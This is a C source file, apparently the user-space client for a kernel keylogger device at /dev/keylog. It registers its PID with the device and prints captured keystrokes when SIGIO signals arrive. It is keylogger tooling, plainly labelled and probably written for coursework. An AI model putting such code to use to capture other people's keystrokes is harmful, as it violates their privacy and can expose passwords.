#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <signal.h>
#include <string.h>

#define CONSOLE 0
#define BUF_SIZE 1024

FILE *fp;
char* read_buf;

void io_ready( int signum ) {
    rewind( fp );
    memset( read_buf, 0, BUF_SIZE );
    fread( read_buf, 1, BUF_SIZE, fp );

    printf( "Reading %s from keylogger\n", read_buf );
}

int main( int argv, char **argc ) {
    fd_set readset;
    int shouldExit = 0;

    fp = fopen( "/dev/keylog", "r+" );
    if ( fp == NULL ) {
        perror( "Failed to open keylog file" );
        return -1;
    }

    pid_t this_pid = getpid();

    fprintf( fp, "%d", this_pid);
    fflush( fp );

    read_buf = (char*) calloc( BUF_SIZE, sizeof(char) );
    if ( read_buf == NULL ) {
        perror( "Failed to allocate file read buffer." );
        return -1;
    }

    signal( SIGIO, io_ready ); // Register for IO signals

    printf( "Listening for keypresses. Press 'q' to exit.\n" );

    FD_ZERO( &readset );
    
    while ( !shouldExit ) {
        FD_SET( CONSOLE, &readset );

        if ( select( 0 + 1, &readset, NULL, NULL, NULL ) != 0 ) {
            if ( FD_ISSET( CONSOLE, &readset ) ) {
                char c = getchar();
                if ( c == 'q' ) {
                    printf( "Exiting...\n" );
                    shouldExit=1;
                }
            }
        }
    }

    //fp = fopen( "/dev/keylog", "r+" );
    //if ( fp == NULL ) {
    //    perror( "Failed to open keylog file" );
    //    return -1;
   // }

    //fprintf( fp, "%d", this_pid );
    //fflush( fp );

    if ( read_buf != NULL ) {
        free( read_buf );
    }

    fprintf( fp, "%d", this_pid );
    fflush( fp );
    fclose( fp );

    //fp = fopen( "/dev/keylog", "r+" );
    //if ( fp == NULL ) {
    //    perror( "Failed to open keylog file" );
    //    return -1;
    //}

    //fprintf( fp, "%d", getpid() );
    //fflush( fp );
    //fclose( fp );

    return 0;
}
